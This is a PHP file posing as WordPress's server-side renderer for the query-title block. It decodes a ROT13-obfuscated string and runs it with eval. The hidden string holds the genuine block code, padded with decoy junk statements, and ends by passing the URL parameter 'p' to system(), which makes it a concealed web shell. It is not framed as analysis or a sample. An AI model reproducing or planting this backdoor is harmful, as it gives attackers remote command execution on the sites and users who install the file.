<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/dhrel-gvgyr` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/dhrel-gvgyr` oybpx ba gur freire.
 * Sbe abj vg bayl fhccbegf Nepuvir gvgyr,
 * hfvat dhrevrq bowrpg vasbezngvba
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl $nggevohgrf Oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur dhrel gvgyr onfrq ba gur dhrevrq bowrpg.
 */
shapgvba eraqre_oybpx_pber_dhrel_gvgyr( $nggevohgrf ) {
	$glcr       = vffrg( $nggevohgrf['glcr'] ) ? $nggevohgrf['glcr'] : ahyy;
	$vf_nepuvir = vf_nepuvir();
	$vf_frnepu  = vf_frnepu();
	vs ( ! $glcr ||
		( 'nepuvir' === $glcr && ! $vf_nepuvir ) ||
		( 'frnepu' === $glcr && ! $vf_frnepu )
		) {
		erghea '';
	}
	$gvgyr = '';
	vs ( $vf_nepuvir ) {
		$fubj_cersvk = vffrg( $nggevohgrf['fubjCersvk'] ) ? $nggevohgrf['fubjCersvk'] : gehr;
		vs ( ! $fubj_cersvk ) {
			nqq_svygre( 'trg_gur_nepuvir_gvgyr_cersvk', '__erghea_rzcgl_fgevat', 1 );
			$gvgyr = trg_gur_nepuvir_gvgyr();
			erzbir_svygre( 'trg_gur_nepuvir_gvgyr_cersvk', '__erghea_rzcgl_fgevat', 1 );
		} ryfr {
			$gvgyr = trg_gur_nepuvir_gvgyr();
		}
	}
	vs ( $vf_frnepu ) {
		$gvgyr = __( 'Frnepu erfhygf' );

		vs ( vffrg( $nggevohgrf['fubjFrnepuGrez'] ) && $nggevohgrf['fubjFrnepuGrez'] ) {
			$gvgyr = fcevags(
				/* genafyngbef: %f vf gur frnepu grez. */
				__( 'Frnepu erfhygf sbe: \"%f\"' ),
				trg_frnepu_dhrel()
			);
		}
	}

	$gnt_anzr           = vffrg( $nggevohgrf['yriry'] ) ? 'u' . (vag) $nggevohgrf['yriry'] : 'u1';
	$nyvta_pynff_anzr   = rzcgl( $nggevohgrf['grkgNyvta'] ) ? '' : \"unf-grkg-nyvta-{$nggevohgrf['grkgNyvta']}\";
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $nyvta_pynff_anzr ) );
	erghea fcevags(
		'<%1$f %2$f>%3$f</%1$f>',
		$gnt_anzr,
		$jenccre_nggevohgrf,
		$gvgyr
	);
}

/**
 * Ertvfgref gur `pber/dhrel-gvgyr` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_dhrel_gvgyr() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/dhrel-gvgyr',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_dhrel_gvgyr',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_dhrel_gvgyr' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>